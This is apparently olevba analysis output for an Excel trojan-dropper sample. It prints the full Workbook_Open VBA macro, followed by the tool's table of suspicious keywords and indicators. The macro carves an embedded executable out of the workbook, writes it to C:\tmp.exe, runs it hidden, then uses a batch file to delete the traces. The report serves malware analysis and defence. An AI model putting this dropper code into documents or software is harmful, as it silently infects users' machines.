olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSExcel.Tored.c-8e2564cce82bd9b7aa4794ef81b80b1e5ab6b944
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EstaPasta_de_trabalho.cls 
in file: Trojan-Dropper.MSExcel.Tored.c-8e2564cce82bd9b7aa4794ef81b80b1e5ab6b944 - OLE stream: '_VBA_PROJECT_CUR/VBA/EstaPasta_de_trabalho'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
Dim AD() As Byte
Dim KL() As Byte
Dim I As Long
Const TAD As Long = 24576
Const TKL As Long = 172313
If FileLen(ActiveWorkbook.FullName) <> (TAD + TKL) Then Exit Sub
ReDim AD(TAD + TKL)
Open ActiveWorkbook.FullName For Binary As #1
    Get #1, , AD()
Close #1
If AD(TAD) <> 77 Or AD(TAD + 1) <> 90 Then Exit Sub
ReDim KL(TKL)
For I = TAD To TAD + TKL - 1
    KL(I - TAD) = AD(I)
Next
Open "C:\tmp.exe" For Binary As #1
    Put #1, , KL()
Close #1
Shell "C:\tmp.exe", vbHide
Open "C:\tmp.bat" For Output As #1
    Print #1, ":rep"
    Print #1, "del C:\tmp.exe"
    Print #1, "if exist C:\tmp.exe goto rep"
    Print #1, "del C:\tmp.bat"
Close #1
Shell "C:\tmp.bat", vbHide
ActiveWorkbook.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Plan1.cls 
in file: Trojan-Dropper.MSExcel.Tored.c-8e2564cce82bd9b7aa4794ef81b80b1e5ab6b944 - OLE stream: '_VBA_PROJECT_CUR/VBA/Plan1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Plan
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tmp.exe             |Executable file name                         |
|IOC       |tmp.bat             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

